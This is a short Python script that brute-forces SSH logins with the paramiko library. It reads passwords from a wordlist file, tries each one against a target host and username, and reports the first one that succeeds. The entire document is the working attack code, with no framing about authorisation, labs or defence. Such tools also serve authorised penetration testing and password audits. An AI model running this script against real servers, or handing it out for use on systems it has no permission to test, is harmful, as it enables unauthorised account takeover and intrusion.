import paramiko

def run_ssh_bruteforce(target, username, wordlist_file):
    print(f"\n--- Brute-forcing SSH on {target} ---")
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    with open(wordlist_file, 'r') as f:
        for password in f.readlines():
            password = password.strip()
            try:
                ssh.connect(target, username=username, password=password, timeout=2)
                print(f"[!] SUCCESS: Password found: {password}")
                ssh.close()
                return
            except paramiko.AuthenticationException:
                print(f"[-] Failed: {password}")
            except Exception as e:
                print(f"[X] Error: {e}")